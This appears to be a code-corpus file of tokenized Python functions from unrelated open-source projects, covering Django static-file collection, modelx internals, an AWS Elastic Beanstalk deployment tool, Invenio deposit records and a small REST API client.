def delete_file ( self , path , prefixed_path , source_storage ) : if self . storage . exists ( prefixed_path ) : try : # When was the target file modified last time? target_last_modified = self . storage . modified_time ( prefixed_path ) except ( OSError , NotImplementedError , AttributeError ) : # The storage doesn't support ``modified_time`` or failed pass else : try : # When was the source file modified last time? source_last_modified = source_storage . modified_time ( path ) except ( OSError , NotImplementedError , AttributeError ) : pass else : # The full path of the target file if self . local : full_path = self . storage . path ( prefixed_path ) else : full_path = None # Skip the file if the source file is younger # Avoid sub-second precision (see #14665, #19540) if ( target_last_modified . replace ( microsecond = 0 ) >= source_last_modified . replace ( microsecond = 0 ) ) : if not ( ( self . symlink and full_path and not os . path . islink ( full_path ) ) or ( not self . symlink and full_path and os . path . islink ( full_path ) ) ) : if prefixed_path not in self . unmodified_files : self . unmodified_files . append ( prefixed_path ) self . log ( "Skipping '%s' (not modified)" % path ) return False # Then delete the existing file if really needed if self . dry_run : self . log ( "Pretending to delete '%s'" % path ) else : self . log ( "Deleting '%s'" % path ) self . storage . delete ( prefixed_path ) return True
def link_file ( self , path , prefixed_path , source_storage ) : # Skip this file if it was already copied earlier if prefixed_path in self . symlinked_files : return self . log ( "Skipping '%s' (already linked earlier)" % path ) # Delete the target file if needed or break if not self . delete_file ( path , prefixed_path , source_storage ) : return # The full path of the source file source_path = source_storage . path ( path ) # Finally link the file if self . dry_run : self . log ( "Pretending to link '%s'" % source_path , level = 1 ) else : self . log ( "Linking '%s'" % source_path , level = 1 ) full_path = self . storage . path ( prefixed_path ) try : os . makedirs ( os . path . dirname ( full_path ) ) except OSError : pass try : if os . path . lexists ( full_path ) : os . unlink ( full_path ) os . symlink ( source_path , full_path ) except AttributeError : import platform raise CommandError ( "Symlinking is not supported by Python %s." % platform . python_version ( ) ) except NotImplementedError : import platform raise CommandError ( "Symlinking is not supported in this " "platform (%s)." % platform . platform ( ) ) except OSError as e : raise CommandError ( e ) if prefixed_path not in self . symlinked_files : self . symlinked_files . append ( prefixed_path )
def copy_file ( self , path , prefixed_path , source_storage ) : # Skip this file if it was already copied earlier if prefixed_path in self . copied_files : return self . log ( "Skipping '%s' (already copied earlier)" % path ) # Delete the target file if needed or break if not self . delete_file ( path , prefixed_path , source_storage ) : return # The full path of the source file source_path = source_storage . path ( path ) # Finally start copying if self . dry_run : self . log ( "Pretending to copy '%s'" % source_path , level = 1 ) else : self . log ( "Copying '%s'" % source_path , level = 1 ) with source_storage . open ( path ) as source_file : self . storage . save ( prefixed_path , source_file ) self . copied_files . append ( prefixed_path )
def _baseattrs ( self ) : result = super ( ) . _baseattrs result [ "spaces" ] = self . spaces . _baseattrs return result
def restore_state ( self , system ) : for space in self . _spaces . values ( ) : space . restore_state ( system )
def get_node ( obj , args , kwargs ) : if args is None and kwargs is None : return ( obj , ) if kwargs is None : kwargs = { } return obj , _bind_args ( obj , args , kwargs )
def node_get_args ( node ) : obj = node [ OBJ ] key = node [ KEY ] boundargs = obj . formula . signature . bind ( * key ) boundargs . apply_defaults ( ) return boundargs . arguments
def get_object ( name : str ) : # TODO: Duplicate of system.get_object elms = name . split ( "." ) parent = get_models ( ) [ elms . pop ( 0 ) ] while len ( elms ) > 0 : obj = elms . pop ( 0 ) parent = getattr ( parent , obj ) return parent
def restore_ipython ( self ) : if not self . is_ipysetup : return shell_class = type ( self . shell ) shell_class . showtraceback = shell_class . default_showtraceback del shell_class . default_showtraceback self . is_ipysetup = False
def restore_python ( self ) : orig = self . orig_settings sys . setrecursionlimit ( orig [ "sys.recursionlimit" ] ) if "sys.tracebacklimit" in orig : sys . tracebacklimit = orig [ "sys.tracebacklimit" ] else : if hasattr ( sys , "tracebacklimit" ) : del sys . tracebacklimit if "showwarning" in orig : warnings . showwarning = orig [ "showwarning" ] orig . clear ( ) threading . stack_size ( )
def get_object ( self , name ) : parts = name . split ( "." ) model_name = parts . pop ( 0 ) return self . models [ model_name ] . get_object ( "." . join ( parts ) )
def get_interfaces ( impls ) : if impls is None : return None elif isinstance ( impls , OrderMixin ) : result = OrderedDict ( ) for name in impls . order : result [ name ] = impls [ name ] . interface return result elif isinstance ( impls , Mapping ) : return { name : impls [ name ] . interface for name in impls } elif isinstance ( impls , Sequence ) : return [ impl . interface for impl in impls ] else : return impls . interface
def get_impls ( interfaces ) : if interfaces is None : return None elif isinstance ( interfaces , Mapping ) : return { name : interfaces [ name ] . _impl for name in interfaces } elif isinstance ( interfaces , Sequence ) : return [ interfaces . _impl for interfaces in interfaces ] else : return interfaces . _impl
def _baseattrs ( self ) : result = { "type" : type ( self ) . __name__ , "id" : id ( self ) , "name" : self . name , "fullname" : self . fullname , "repr" : self . _get_repr ( ) , } return result
def _baseattrs ( self ) : result = { "type" : type ( self ) . __name__ } try : result [ "items" ] = { name : item . _baseattrs for name , item in self . items ( ) if name [ 0 ] != "_" } except : raise RuntimeError ( "%s literadict raised an error" % self ) return result
def convert_args ( args , kwargs ) : found = False for arg in args : if isinstance ( arg , Cells ) : found = True break if found : args = tuple ( arg . value if isinstance ( arg , Cells ) else arg for arg in args ) if kwargs is not None : for key , arg in kwargs . items ( ) : if isinstance ( arg , Cells ) : kwargs [ key ] = arg . value return args , kwargs
def copy ( self , space = None , name = None ) : return Cells ( space = space , name = name , formula = self . formula )
def _baseattrs ( self ) : result = super ( ) . _baseattrs result [ "params" ] = ", " . join ( self . parameters ) return result
def value ( self ) : if self . has_value : return self . _impl [ OBJ ] . get_value ( self . _impl [ KEY ] ) else : raise ValueError ( "Value not found" )
def _baseattrs ( self ) : result = { "type" : type ( self ) . __name__ , "obj" : self . cells . _baseattrs , "args" : self . args , "value" : self . value if self . has_value else None , "predslen" : len ( self . preds ) , "succslen" : len ( self . succs ) , "repr_parent" : self . cells . _impl . repr_parent ( ) , "repr" : self . cells . _get_repr ( ) , } return result
def move_elements ( source , index_to , index_from , length ) : sublist = [ source . pop ( index_from ) for _ in range ( length ) ] for _ in range ( length ) : source . insert ( index_to , sublist . pop ( ) )
def _get_col_index ( name ) : index = string . ascii_uppercase . index col = 0 for c in name . upper ( ) : col = col * 26 + index ( c ) + 1 return col
def _get_range ( book , range_ , sheet ) : filename = None if isinstance ( book , str ) : filename = book book = opxl . load_workbook ( book , data_only = True ) elif isinstance ( book , opxl . Workbook ) : pass else : raise TypeError if _is_range_address ( range_ ) : sheet_names = [ name . upper ( ) for name in book . sheetnames ] index = sheet_names . index ( sheet . upper ( ) ) data = book . worksheets [ index ] [ range_ ] else : data = _get_namedrange ( book , range_ , sheet ) if data is None : raise ValueError ( "Named range '%s' not found in %s" % ( range_ , filename or book ) ) return data
def find_funcdef ( source ) : try : module_node = compile ( source , "<string>" , mode = "exec" , flags = ast . PyCF_ONLY_AST ) except SyntaxError : return find_funcdef ( fix_lamdaline ( source ) ) for node in ast . walk ( module_node ) : if isinstance ( node , ast . FunctionDef ) or isinstance ( node , ast . Lambda ) : return node raise ValueError ( "function definition not found" )
def extract_params ( source ) : funcdef = find_funcdef ( source ) params = [ ] for node in ast . walk ( funcdef . args ) : if isinstance ( node , ast . arg ) : if node . arg not in params : params . append ( node . arg ) return params
def is_funcdef ( src ) : module_node = ast . parse ( dedent ( src ) ) if len ( module_node . body ) == 1 and isinstance ( module_node . body [ 0 ] , ast . FunctionDef ) : return True else : return False
def remove_decorator ( source : str ) : lines = source . splitlines ( ) atok = asttokens . ASTTokens ( source , parse = True ) for node in ast . walk ( atok . tree ) : if isinstance ( node , ast . FunctionDef ) : break if node . decorator_list : deco_first = node . decorator_list [ 0 ] deco_last = node . decorator_list [ - 1 ] line_first = atok . tokens [ deco_first . first_token . index - 1 ] . start [ 0 ] line_last = atok . tokens [ deco_last . last_token . index + 1 ] . start [ 0 ] lines = lines [ : line_first - 1 ] + lines [ line_last : ] return "\n" . join ( lines ) + "\n"
def has_lambda ( src ) : module_node = ast . parse ( dedent ( src ) ) lambdaexp = [ node for node in ast . walk ( module_node ) if isinstance ( node , ast . Lambda ) ] return bool ( lambdaexp )
def get_description ( ) : with open ( path . join ( here , 'README.rst' ) , 'r' ) as f : data = f . read ( ) return data
def _baseattrs ( self ) : result = super ( ) . _baseattrs result [ "static_spaces" ] = self . static_spaces . _baseattrs result [ "dynamic_spaces" ] = self . dynamic_spaces . _baseattrs result [ "cells" ] = self . cells . _baseattrs result [ "refs" ] = self . refs . _baseattrs if self . has_params ( ) : result [ "params" ] = ", " . join ( self . parameters ) else : result [ "params" ] = "" return result
def import_funcs ( self , module ) : # Outside formulas only newcells = self . _impl . new_cells_from_module ( module ) return get_interfaces ( newcells )
def get_object ( self , name ) : parts = name . split ( "." ) child = parts . pop ( 0 ) if parts : return self . spaces [ child ] . get_object ( "." . join ( parts ) ) else : return self . _namespace_impl [ child ]
def _new_dynspace ( self , name = None , bases = None , formula = None , refs = None , arguments = None , source = None , ) : if name is None : name = self . spacenamer . get_next ( self . namespace ) if name in self . namespace : raise ValueError ( "Name '%s' already exists." % name ) if not is_valid_name ( name ) : raise ValueError ( "Invalid name '%s'." % name ) space = RootDynamicSpaceImpl ( parent = self , name = name , formula = formula , refs = refs , source = source , arguments = arguments , ) space . is_derived = False self . _set_space ( space ) if bases : # i.e. not [] dynbase = self . _get_dynamic_base ( bases ) space . _dynbase = dynbase dynbase . _dynamic_subs . append ( space ) return space
def restore_state ( self , system ) : super ( ) . restore_state ( system ) BaseSpaceContainerImpl . restore_state ( self , system ) for cells in self . _cells . values ( ) : cells . restore_state ( system )
def del_space ( self , name ) : if name not in self . spaces : raise ValueError ( "Space '%s' does not exist" % name ) if name in self . static_spaces : space = self . static_spaces [ name ] if space . is_derived : raise ValueError ( "%s has derived spaces" % repr ( space . interface ) ) else : self . static_spaces . del_item ( name ) self . model . spacegraph . remove_node ( space ) self . inherit ( ) self . model . spacegraph . update_subspaces ( self ) # TODO: Destroy space elif name in self . dynamic_spaces : # TODO: Destroy space self . dynamic_spaces . del_item ( name ) else : raise ValueError ( "Derived cells cannot be deleted" )
def clear_obj ( self , obj ) : obj_nodes = self . get_nodes_with ( obj ) removed = set ( ) for node in obj_nodes : if self . has_node ( node ) : removed . update ( self . clear_descendants ( node ) ) return removed
def get_nodes_with ( self , obj ) : result = set ( ) if nx . __version__ [ 0 ] == "1" : nodes = self . nodes_iter ( ) else : nodes = self . nodes for node in nodes : if node [ OBJ ] == obj : result . add ( node ) return result
def add_path ( self , nodes , * * attr ) : if nx . __version__ [ 0 ] == "1" : return super ( ) . add_path ( nodes , * * attr ) else : return nx . add_path ( self , nodes , * * attr )
def rename ( self , name ) : self . _impl . system . rename_model ( new_name = name , old_name = self . name )
def rename ( self , name ) : if is_valid_name ( name ) : if name not in self . system . models : self . name = name return True # Rename success else : # Model name already exists return False else : raise ValueError ( "Invalid name '%s'." % name )
def clear_descendants ( self , source , clear_source = True ) : removed = self . cellgraph . clear_descendants ( source , clear_source ) for node in removed : del node [ OBJ ] . data [ node [ KEY ] ]
def clear_obj ( self , obj ) : removed = self . cellgraph . clear_obj ( obj ) for node in removed : del node [ OBJ ] . data [ node [ KEY ] ]
def get_object ( self , name ) : parts = name . split ( "." ) space = self . spaces [ parts . pop ( 0 ) ] if parts : return space . get_object ( "." . join ( parts ) ) else : return space
def restore_state ( self , system ) : Impl . restore_state ( self , system ) BaseSpaceContainerImpl . restore_state ( self , system ) mapping = { } for node in self . cellgraph : if isinstance ( node , tuple ) : name , key = node else : name , key = node , None cells = self . get_object ( name ) mapping [ node ] = get_node ( cells , key , None ) self . cellgraph = nx . relabel_nodes ( self . cellgraph , mapping )
def get_dynamic_base ( self , bases : tuple ) : try : return self . _dynamic_bases_inverse [ bases ] except KeyError : name = self . _dynamic_base_namer . get_next ( self . _dynamic_bases ) base = self . _new_space ( name = name ) self . spacegraph . add_space ( base ) self . _dynamic_bases [ name ] = base self . _dynamic_bases_inverse [ bases ] = base base . add_bases ( bases ) return base
def check_mro ( self , bases ) : try : self . add_node ( "temp" ) for base in bases : nx . DiGraph . add_edge ( self , base , "temp" ) result = self . get_mro ( "temp" ) [ 1 : ] finally : self . remove_node ( "temp" ) return result
def get_command_names ( ) : ret = [ ] for f in os . listdir ( COMMAND_MODULE_PATH ) : if os . path . isfile ( os . path . join ( COMMAND_MODULE_PATH , f ) ) and f . endswith ( COMMAND_MODULE_SUFFIX ) : ret . append ( f [ : - len ( COMMAND_MODULE_SUFFIX ) ] ) return ret
def get ( vals , key , default_val = None ) : val = vals for part in key . split ( '.' ) : if isinstance ( val , dict ) : val = val . get ( part , None ) if val is None : return default_val else : return default_val return val
def parse_option_settings ( option_settings ) : ret = [ ] for namespace , params in list ( option_settings . items ( ) ) : for key , value in list ( params . items ( ) ) : ret . append ( ( namespace , key , value ) ) return ret
def parse_env_config ( config , env_name ) : all_env = get ( config , 'app.all_environments' , { } ) env = get ( config , 'app.environments.' + str ( env_name ) , { } ) return merge_dict ( all_env , env )
def add_config_files_to_archive ( directory , filename , config = { } ) : with zipfile . ZipFile ( filename , 'a' ) as zip_file : for conf in config : for conf , tree in list ( conf . items ( ) ) : if 'yaml' in tree : content = yaml . dump ( tree [ 'yaml' ] , default_flow_style = False ) else : content = tree . get ( 'content' , '' ) out ( "Adding file " + str ( conf ) + " to archive " + str ( filename ) ) file_entry = zipfile . ZipInfo ( conf ) file_entry . external_attr = tree . get ( 'permissions' , 0o644 ) << 16 zip_file . writestr ( file_entry , content ) return filename
def swap_environment_cnames ( self , from_env_name , to_env_name ) : self . ebs . swap_environment_cnames ( source_environment_name = from_env_name , destination_environment_name = to_env_name )
def upload_archive ( self , filename , key , auto_create_bucket = True ) : try : bucket = self . s3 . get_bucket ( self . aws . bucket ) if ( ( self . aws . region != 'us-east-1' and self . aws . region != 'eu-west-1' ) and bucket . get_location ( ) != self . aws . region ) or ( self . aws . region == 'us-east-1' and bucket . get_location ( ) != '' ) or ( self . aws . region == 'eu-west-1' and bucket . get_location ( ) != 'eu-west-1' ) : raise Exception ( "Existing bucket doesn't match region" ) except S3ResponseError : bucket = self . s3 . create_bucket ( self . aws . bucket , location = self . aws . region ) def __report_upload_progress ( sent , total ) : if not sent : sent = 0 if not total : total = 0 out ( "Uploaded " + str ( sent ) + " bytes of " + str ( total ) + " (" + str ( int ( float ( max ( 1 , sent ) ) / float ( total ) * 100 ) ) + "%)" ) # upload the new version k = Key ( bucket ) k . key = self . aws . bucket_path + key k . set_metadata ( 'time' , str ( time ( ) ) ) k . set_contents_from_filename ( filename , cb = __report_upload_progress , num_cb = 10 )
def application_exists ( self ) : response = self . ebs . describe_applications ( application_names = [ self . app_name ] ) return len ( response [ 'DescribeApplicationsResponse' ] [ 'DescribeApplicationsResult' ] [ 'Applications' ] ) > 0
def create_environment ( self , env_name , version_label = None , solution_stack_name = None , cname_prefix = None , description = None , option_settings = None , tier_name = 'WebServer' , tier_type = 'Standard' , tier_version = '1.1' ) : out ( "Creating environment: " + str ( env_name ) + ", tier_name:" + str ( tier_name ) + ", tier_type:" + str ( tier_type ) ) self . ebs . create_environment ( self . app_name , env_name , version_label = version_label , solution_stack_name = solution_stack_name , cname_prefix = cname_prefix , description = description , option_settings = option_settings , tier_type = tier_type , tier_name = tier_name , tier_version = tier_version )
def environment_exists ( self , env_name ) : response = self . ebs . describe_environments ( application_name = self . app_name , environment_names = [ env_name ] , include_deleted = False ) return len ( response [ 'DescribeEnvironmentsResponse' ] [ 'DescribeEnvironmentsResult' ] [ 'Environments' ] ) > 0 and response [ 'DescribeEnvironmentsResponse' ] [ 'DescribeEnvironmentsResult' ] [ 'Environments' ] [ 0 ] [ 'Status' ] != 'Terminated'
def update_environment ( self , environment_name , description = None , option_settings = [ ] , tier_type = None , tier_name = None , tier_version = '1.0' ) : out ( "Updating environment: " + str ( environment_name ) ) messages = self . ebs . validate_configuration_settings ( self . app_name , option_settings , environment_name = environment_name ) messages = messages [ 'ValidateConfigurationSettingsResponse' ] [ 'ValidateConfigurationSettingsResult' ] [ 'Messages' ] ok = True for message in messages : if message [ 'Severity' ] == 'error' : ok = False out ( "[" + message [ 'Severity' ] + "] " + str ( environment_name ) + " - '" + message [ 'Namespace' ] + ":" + message [ 'OptionName' ] + "': " + message [ 'Message' ] ) self . ebs . update_environment ( environment_name = environment_name , description = description , option_settings = option_settings , tier_type = tier_type , tier_name = tier_name , tier_version = tier_version )
def environment_name_for_cname ( self , env_cname ) : envs = self . get_environments ( ) for env in envs : if env [ 'Status' ] != 'Terminated' and 'CNAME' in env and env [ 'CNAME' ] and env [ 'CNAME' ] . lower ( ) . startswith ( env_cname . lower ( ) + '.' ) : return env [ 'EnvironmentName' ] return None
def deploy_version ( self , environment_name , version_label ) : out ( "Deploying " + str ( version_label ) + " to " + str ( environment_name ) ) self . ebs . update_environment ( environment_name = environment_name , version_label = version_label )
def get_versions ( self ) : response = self . ebs . describe_application_versions ( application_name = self . app_name ) return response [ 'DescribeApplicationVersionsResponse' ] [ 'DescribeApplicationVersionsResult' ] [ 'ApplicationVersions' ]
def create_application_version ( self , version_label , key ) : out ( "Creating application version " + str ( version_label ) + " for " + str ( key ) ) self . ebs . create_application_version ( self . app_name , version_label , s3_bucket = self . aws . bucket , s3_key = self . aws . bucket_path + key )
def describe_events ( self , environment_name , next_token = None , start_time = None ) : events = self . ebs . describe_events ( application_name = self . app_name , environment_name = environment_name , next_token = next_token , start_time = start_time + 'Z' ) return ( events [ 'DescribeEventsResponse' ] [ 'DescribeEventsResult' ] [ 'Events' ] , events [ 'DescribeEventsResponse' ] [ 'DescribeEventsResult' ] [ 'NextToken' ] )
def add_arguments ( parser ) : parser . add_argument ( '-o' , '--old-environment' , help = 'Old environment name' , required = True ) parser . add_argument ( '-n' , '--new-environment' , help = 'New environment name' , required = True )
def execute ( helper , config , args ) : env = parse_env_config ( config , args . environment ) option_settings = env . get ( 'option_settings' , { } ) settings = parse_option_settings ( option_settings ) for setting in settings : out ( str ( setting ) )
def execute ( helper , config , args ) : version_label = args . version_label env_config = parse_env_config ( config , args . environment ) env_name = args . environment # upload or build an archive version_label = upload_application_archive ( helper , env_config , archive = args . archive , directory = args . directory , version_label = version_label ) import datetime start_time = datetime . datetime . utcnow ( ) . isoformat ( ) + 'Z' # deploy it helper . deploy_version ( env_name , version_label ) # wait if not args . dont_wait : helper . wait_for_environments ( env_name , status = 'Ready' , version_label = version_label , include_deleted = False ) # update it env = parse_env_config ( config , env_name ) option_settings = parse_option_settings ( env . get ( 'option_settings' , { } ) ) helper . update_environment ( env_name , description = env . get ( 'description' , None ) , option_settings = option_settings , tier_type = env . get ( 'tier_type' ) , tier_name = env . get ( 'tier_name' ) , tier_version = env . get ( 'tier_version' ) ) # wait if not args . dont_wait : helper . wait_for_environments ( env_name , health = 'Green' , status = 'Ready' , version_label = version_label , include_deleted = False ) events = helper . ebs . describe_events ( start_time = start_time , environment_name = env_name ) import json if args . log_events_to_file : with open ( 'ebs_events.json' , 'w+' ) as f : json . dump ( events , f ) # delete unused helper . delete_unused_versions ( versions_to_keep = int ( get ( config , 'app.versions_to_keep' , 10 ) ) )
def add_arguments ( parser ) : parser . add_argument ( '-e' , '--environment' , help = 'Environment name' , required = True ) parser . add_argument ( '-w' , '--dont-wait' , help = 'Skip waiting for the init to finish' , action = 'store_true' ) parser . add_argument ( '-l' , '--version-label' , help = 'Version label' , required = False )
def execute ( helper , config , args ) : env_config = parse_env_config ( config , args . environment ) cname_prefix = env_config . get ( 'cname_prefix' , None ) env_name = args . environment # change version if args . version_label : helper . deploy_version ( env_name , args . version_label ) if not args . dont_wait : helper . wait_for_environments ( env_name , status = 'Ready' , version_label = args . version_label ) # update it env = parse_env_config ( config , env_name ) option_settings = parse_option_settings ( env . get ( 'option_settings' , { } ) ) helper . update_environment ( env_name , description = env . get ( 'description' , None ) , option_settings = option_settings , tier_type = env . get ( 'tier_type' ) , tier_name = env . get ( 'tier_name' ) , tier_version = env . get ( 'tier_version' ) ) # wait if not args . dont_wait : helper . wait_for_environments ( env_name , health = 'Green' , status = 'Ready' , version_label = args . version_label ) # delete unused helper . delete_unused_versions ( versions_to_keep = int ( get ( config , 'app.versions_to_keep' , 10 ) ) )
def join_phonemes ( * args ) : # Normalize arguments as onset, nucleus, coda. if len ( args ) == 1 : # tuple of (onset, nucleus[, coda]) args = args [ 0 ] if len ( args ) == 2 : args += ( CODAS [ 0 ] , ) try : onset , nucleus , coda = args except ValueError : raise TypeError ( 'join_phonemes() takes at most 3 arguments' ) offset = ( ( ONSETS . index ( onset ) * NUM_NUCLEUSES + NUCLEUSES . index ( nucleus ) ) * NUM_CODAS + CODAS . index ( coda ) ) return unichr ( FIRST_HANGUL_OFFSET + offset )
def execute ( helper , config , args ) : helper . wait_for_environments ( args . environment , health = args . health )
def add_arguments ( parser ) : parser . add_argument ( '-e' , '--environment' , help = 'Environment name' , required = False , nargs = '+' ) parser . add_argument ( '-w' , '--dont-wait' , help = 'Skip waiting for the app to be deleted' , action = 'store_true' )
def execute ( helper , config , args ) : environment_name = args . environment ( events , next_token ) = helper . describe_events ( environment_name , start_time = datetime . now ( ) . isoformat ( ) ) # swap C-Names for event in events : print ( ( "[" + event [ 'Severity' ] + "] " + event [ 'Message' ] ) )
def add_arguments ( parser ) : parser . add_argument ( '-e' , '--environment' , help = 'Environment name' , required = True ) parser . add_argument ( '-w' , '--dont-wait' , help = 'Skip waiting' , action = 'store_true' ) parser . add_argument ( '-a' , '--archive' , help = 'Archive file' , required = False ) parser . add_argument ( '-d' , '--directory' , help = 'Directory' , required = False ) parser . add_argument ( '-l' , '--version-label' , help = 'Version label' , required = False ) parser . add_argument ( '-t' , '--termination-delay' , help = 'Delay termination of old environment by this number of seconds' , type = int , required = False )
def execute ( helper , config , args ) : version_label = args . version_label archive = args . archive # get the environment configuration env_config = parse_env_config ( config , args . environment ) option_settings = parse_option_settings ( env_config . get ( 'option_settings' , { } ) ) cname_prefix = env_config . get ( 'cname_prefix' , None ) # no zdt for anything but web server tier_name = env_config . get ( 'tier_name' , 'WebServer' ) if tier_name != 'WebServer' : raise Exception ( "Only able to do zero downtime deployments for " "WebServer tiers, can't do them for %s" % ( tier_name , ) ) # find an available environment name out ( "Determining new environment name..." ) new_env_name = None if not helper . environment_exists ( args . environment ) : new_env_name = args . environment else : for i in range ( 10 ) : temp_env_name = args . environment + '-' + str ( i ) if not helper . environment_exists ( temp_env_name ) : new_env_name = temp_env_name break if new_env_name is None : raise Exception ( "Unable to determine new environment name" ) out ( "New environment name will be " + new_env_name ) # find an available cname name out ( "Determining new environment cname..." ) new_env_cname = None for i in range ( 10 ) : temp_cname = cname_prefix + '-' + str ( i ) if not helper . environment_name_for_cname ( temp_cname ) : new_env_cname = temp_cname break if new_env_cname is None : raise Exception ( "Unable to determine new environment cname" ) out ( "New environment cname will be " + new_env_cname ) # upload or build an archive version_label = upload_application_archive ( helper , env_config , archive = args . archive , directory = args . directory , version_label = version_label ) # create the new environment helper . create_environment ( new_env_name , solution_stack_name = env_config . get ( 'solution_stack_name' ) , cname_prefix = new_env_cname , description = env_config . get ( 'description' , None ) , option_settings = option_settings , version_label = version_label , tier_name = tier_name , tier_type = env_config . get ( 'tier_type' ) , tier_version = env_config . get ( 'tier_version' ) ) helper . wait_for_environments ( new_env_name , status = 'Ready' , health = 'Green' , include_deleted = False ) # find existing environment name old_env_name = helper . environment_name_for_cname ( cname_prefix ) if old_env_name is None : raise Exception ( "Unable to find current environment with cname: " + cname_prefix ) out ( "Current environment name is " + old_env_name ) # swap C-Names out ( "Swapping environment cnames" ) helper . swap_environment_cnames ( old_env_name , new_env_name ) helper . wait_for_environments ( [ old_env_name , new_env_name ] , status = 'Ready' , include_deleted = False ) # delete the old environment if args . termination_delay : out ( "Termination delay specified, sleeping for {} seconds..." . format ( args . termination_delay ) ) time . sleep ( args . termination_delay ) out ( "Deleting old environment {}" . format ( old_env_name ) ) helper . delete_environment ( old_env_name ) # delete unused helper . delete_unused_versions ( versions_to_keep = int ( get ( config , 'app.versions_to_keep' , 10 ) ) )
def pick_coda_from_decimal ( decimal ) : decimal = Decimal ( decimal ) __ , digits , exp = decimal . as_tuple ( ) if exp < 0 : return DIGIT_CODAS [ digits [ - 1 ] ] __ , digits , exp = decimal . normalize ( ) . as_tuple ( ) index = bisect_right ( EXP_INDICES , exp ) - 1 if index < 0 : return DIGIT_CODAS [ digits [ - 1 ] ] else : return EXP_CODAS [ EXP_INDICES [ index ] ]
def extract_actions_from_class ( record_class ) : for name in dir ( record_class ) : method = getattr ( record_class , name , None ) if method and getattr ( method , '__deposit_action__' , False ) : yield method . __name__
def create_error_handlers ( blueprint ) : blueprint . errorhandler ( PIDInvalidAction ) ( create_api_errorhandler ( status = 403 , message = 'Invalid action' ) ) records_rest_error_handlers ( blueprint )
def location ( ) : d = current_app . config [ 'DATADIR' ] with db . session . begin_nested ( ) : Location . query . delete ( ) loc = Location ( name = 'local' , uri = d , default = True ) db . session . add ( loc ) db . session . commit ( )
def jsonschemas ( self ) : _jsonschemas = { k : v [ 'jsonschema' ] for k , v in self . app . config [ 'DEPOSIT_RECORDS_UI_ENDPOINTS' ] . items ( ) if 'jsonschema' in v } return defaultdict ( lambda : self . app . config [ 'DEPOSIT_DEFAULT_JSONSCHEMA' ] , _jsonschemas )
def schemaforms ( self ) : _schemaforms = { k : v [ 'schemaform' ] for k , v in self . app . config [ 'DEPOSIT_RECORDS_UI_ENDPOINTS' ] . items ( ) if 'schemaform' in v } return defaultdict ( lambda : self . app . config [ 'DEPOSIT_DEFAULT_SCHEMAFORM' ] , _schemaforms )
def pid ( self ) : pid = self . deposit_fetcher ( self . id , self ) return PersistentIdentifier . get ( pid . pid_type , pid . pid_value )
def record_schema ( self ) : schema_path = current_jsonschemas . url_to_path ( self [ '$schema' ] ) schema_prefix = current_app . config [ 'DEPOSIT_JSONSCHEMAS_PREFIX' ] if schema_path and schema_path . startswith ( schema_prefix ) : return current_jsonschemas . path_to_url ( schema_path [ len ( schema_prefix ) : ] )
def fetch_published ( self ) : pid_type = self [ '_deposit' ] [ 'pid' ] [ 'type' ] pid_value = self [ '_deposit' ] [ 'pid' ] [ 'value' ] resolver = Resolver ( pid_type = pid_type , object_type = 'rec' , getter = partial ( self . published_record_class . get_record , with_deleted = True ) ) return resolver . resolve ( pid_value )
def merge_with_published ( self ) : pid , first = self . fetch_published ( ) lca = first . revisions [ self [ '_deposit' ] [ 'pid' ] [ 'revision_id' ] ] # ignore _deposit and $schema field args = [ lca . dumps ( ) , first . dumps ( ) , self . dumps ( ) ] for arg in args : del arg [ '$schema' ] , arg [ '_deposit' ] args . append ( { } ) m = Merger ( * args ) try : m . run ( ) except UnresolvedConflictsException : raise MergeConflict ( ) return patch ( m . unified_patches , lca )
def commit ( self , * args , * * kwargs ) : return super ( Deposit , self ) . commit ( * args , * * kwargs )
def _process_files ( self , record_id , data ) : if self . files : assert not self . files . bucket . locked self . files . bucket . locked = True snapshot = self . files . bucket . snapshot ( lock = True ) data [ '_files' ] = self . files . dumps ( bucket = snapshot . id ) yield data db . session . add ( RecordsBuckets ( record_id = record_id , bucket_id = snapshot . id ) ) else : yield data
def _publish_edited ( self ) : record_pid , record = self . fetch_published ( ) if record . revision_id == self [ '_deposit' ] [ 'pid' ] [ 'revision_id' ] : data = dict ( self . dumps ( ) ) else : data = self . merge_with_published ( ) data [ '$schema' ] = self . record_schema data [ '_deposit' ] = self [ '_deposit' ] record = record . __class__ ( data , model = record . model ) return record
def rst2node ( doc_name , data ) : if not data : return parser = docutils . parsers . rst . Parser ( ) document = docutils . utils . new_document ( '<%s>' % doc_name ) document . settings = docutils . frontend . OptionParser ( ) . get_default_values ( ) document . settings . tab_width = 4 document . settings . pep_references = False document . settings . rfc_references = False document . settings . env = Env ( ) parser . parse ( data , document ) if len ( document . children ) == 1 : return document . children [ 0 ] else : par = docutils . nodes . paragraph ( ) for child in document . children : par += child return par
def setup ( app ) : if 'http' not in app . domains : httpdomain . setup ( app ) app . add_directive ( 'autopyramid' , RouteDirective )
def _api_request ( self , endpoint , http_method , * args , * * kwargs ) : logger . debug ( ' > Sending API request to endpoint: %s' % endpoint ) auth = self . _build_http_auth ( ) headers = self . _build_request_headers ( kwargs . get ( 'headers' ) ) logger . debug ( '\theaders: %s' % headers ) path = self . _build_request_path ( endpoint ) logger . debug ( '\tpath: %s' % path ) data = self . _build_payload ( kwargs . get ( 'payload' ) ) if not data : data = kwargs . get ( 'data' ) logger . debug ( '\tdata: %s' % data ) req_kw = dict ( auth = auth , headers = headers , timeout = kwargs . get ( 'timeout' , self . DEFAULT_TIMEOUT ) ) # do some error handling if ( http_method == self . HTTP_POST ) : if ( data ) : r = requests . post ( path , data = data , * * req_kw ) else : r = requests . post ( path , * * req_kw ) elif http_method == self . HTTP_PUT : if ( data ) : r = requests . put ( path , data = data , * * req_kw ) else : r = requests . put ( path , * * req_kw ) elif http_method == self . HTTP_DELETE : r = requests . delete ( path , * * req_kw ) else : r = requests . get ( path , * * req_kw ) logger . debug ( '\tresponse code:%s' % r . status_code ) try : logger . debug ( '\tresponse: %s' % r . json ( ) ) except : logger . debug ( '\tresponse: %s' % r . content ) return self . _parse_response ( r )
def get_log ( self , log_id , timeout = None ) : return self . _api_request ( self . GET_LOG_ENDPOINT % log_id , self . HTTP_GET , timeout = timeout )
def get_log_events ( self , log_id , timeout = None ) : return self . _api_request ( self . GET_LOG_EVENTS_ENDPOINT % log_id , self . HTTP_GET , timeout = timeout )
def templates ( self , timeout = None ) : return self . _api_request ( self . TEMPLATES_ENDPOINT , self . HTTP_GET , timeout = timeout )
